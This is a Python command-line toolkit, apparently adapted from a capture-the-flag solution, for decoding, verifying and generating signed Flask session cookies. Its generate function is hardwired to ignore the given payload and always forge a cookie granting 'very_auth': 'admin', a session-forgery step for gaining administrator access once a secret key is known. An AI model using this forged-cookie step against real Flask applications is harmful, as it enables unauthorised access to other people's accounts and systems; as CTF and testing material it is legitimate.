#!/usr/bin/env python3
# encoding: utf-8

"""
Flask session cookie toolkit.
Decode, verify or generate a signed Flask session cookie.
Credits to Terry Vogelsang for the original script (https://terryvogelsang.tech/MITRECTF2018-my-flask-app/)
which I just slightly modified for my personal use.
"""

from hashlib import sha512
from flask.sessions import session_json_serializer
from itsdangerous import URLSafeTimedSerializer, BadTimeSignature
import argparse
import base64
from zlib import decompress
import sys
import json

# GENERAL FUNCTIONS.

def debug(msg):
  if VERBOSE_OUTPUT:
    print("[DEBUG] " + msg)

def pretty_print_json_data(json_data):
  json_pretty_str = json.dumps(json_data, indent=4)
  print(json_pretty_str)

# COOKIE DECODER.

def decode_cookie_payload(cookie):
  debug(f"Cookie:\n{cookie}")
  # If the cookie starts with a dot the paylod is base64 encoded and GZIP compressed.
  if cookie[0] == ".":
    b64_gzip_payload = cookie[1:].split(".")[0]
    # Python needs the padding which is stripped in the base64_URLsafe version (see https://stackoverflow.com/questions/2941995/python-ignore-incorrect-padding-error-when-base64-decoding#comment12174484_2942039)
    b64_gzip_payload += "=" * (-len(b64_gzip_payload) % 4)
    debug(f"Encoded and compressed payload:\n{b64_gzip_payload}")
    gzip_payload = base64.urlsafe_b64decode(b64_gzip_payload)
    payload = decompress(gzip_payload)
    debug(f"Decoded and decompressed payload:\n{payload}")
  else:
    # If the cookie does not start with a dot the payload is just base64 encoded.
    b64_payload = cookie.split(".")[0]
    # Python needs the padding which is stripped in the base64_URLsafe version (see https://stackoverflow.com/questions/2941995/python-ignore-incorrect-padding-error-when-base64-decoding#comment12174484_2942039)
    b64_payload += "=" * (-len(b64_payload) % 4)
    debug(f"Encoded payload:\n{b64_payload}")
    payload = base64.urlsafe_b64decode(b64_payload)
    debug(f"Decoded payload:\n{payload}")
  
  return payload

def output_decoded_payload(payload, json_pretty, str_encoding):  
  str_payload = payload.decode(str_encoding)
  if json_pretty:
    # Pretty print the JSON data.
    try:
      debug(f"Payload string (encoding=\"{str_encoding}\"):\n{str_payload}")
      pretty_print_json_data(json.loads(str_payload))
    except:
      print("The payload is not valid JSON!", file=sys.stderr)
      sys.exit(1)
  else:
    # Do not pretty print the JSON data.
    print(str_payload)
    sys.exit(0)

# COOKIE VERIFIER.

def readAndVerifyCookie(cookie, secret_key):
  debug(f"Cookie:\n{cookie}")
  signer = URLSafeTimedSerializer(
    secret_key, salt="cookie-session",
    serializer=session_json_serializer,
    signer_kwargs={"key_derivation": "hmac", "digest_method": sha512}
  )
  try:
    session_data = signer.loads(cookie)
    print("The signature is correct!")
    return session_data
  except BadTimeSignature:
    print(f"The signature is not correct!")
    sys.exit(1)

# COOKIE GENERATOR.

def generate_cookie(json_str_payload, key):
  try:
    #payload = json.loads(json_str_payload)
    pl= {}
    pl["very_auth"] = "admin"
    payload = pl
    print(payload)
  except:
    print("Your payload is not a valid JSON string!")
    sys.exit(1)

  signer = URLSafeTimedSerializer(
      key, salt="cookie-session",
      serializer=session_json_serializer,
      signer_kwargs={"key_derivation": "hmac", "digest_method": sha512}
  )
  cookie = signer.dumps(payload)
  return cookie

# MAIN.

if __name__ == "__main__":
  # Argparse setup.
  argparser = argparse.ArgumentParser(description="Pefroma various actions regarding a Flask session COOKIE.")
  argparser.add_argument("command", metavar="COMMAND", choices=["decode", "verify", "generate"], help="the command to execute")
  argparser.add_argument("-c", "--cookie", metavar="COOKIE", help="the COOKIE to decode or verify")
  argparser.add_argument("-k", "--key", metavar="SECRET_KEY", help="the SECRET_KEY to sign or verify the cookie with")
  argparser.add_argument("-p", "--payload", metavar="PAYLOAD", help="the PAYLOAD to encode in teh cookie")
  argparser.add_argument("-v", "--verbose", action="store_true", help="enable verbose output")
  argparser.add_argument("--pretty-json", action="store_true", help="whether to pretty print the JSON data")
  argparser.add_argument("--encoding", default="UTF-8", help="the ENCODING to use when parsing data as a string")
  # Parse arguments.
  args = argparser.parse_args()
  command = args.command
  VERBOSE_OUTPUT = args.verbose
  # Choose command.
  if command == "decode":
    # Check arguments.
    if args.cookie is None:
      argparser.error("The 'decode' command requires the --cookie argument.")
    cookie = args.cookie
    json_pretty = args.pretty_json
    str_encoding = args.encoding
    # Decode.
    payload = decode_cookie_payload(cookie)
    # Output.
    output_decoded_payload(payload, json_pretty, str_encoding)
  elif command == "verify":
    # Check arguments.
    if args.cookie is None or args.key is None:
      argparser.error("The 'verify' command requires both the --cookie and the --key arguments.")
    cookie = args.cookie
    key = args.key
    pretty_json = args.pretty_json
    # Verify.
    session_data = readAndVerifyCookie(cookie, key)
    # Output.
    print('')
    if pretty_json:
      debug(f"Session data:\n{session_data}")
      pretty_print_json_data(session_data)
    else:
      print(json.dumps(session_data))
  elif command == "generate":
    # Check arguments.
    if args.payload is None or args.key is None:
      argparser.error("The 'generate' command requires both the --payload and the --key arguments.")
    payload = args.payload
    key = args.key
    # Generate.
    cookie = generate_cookie(payload, key)
    # Output.
    print(cookie)
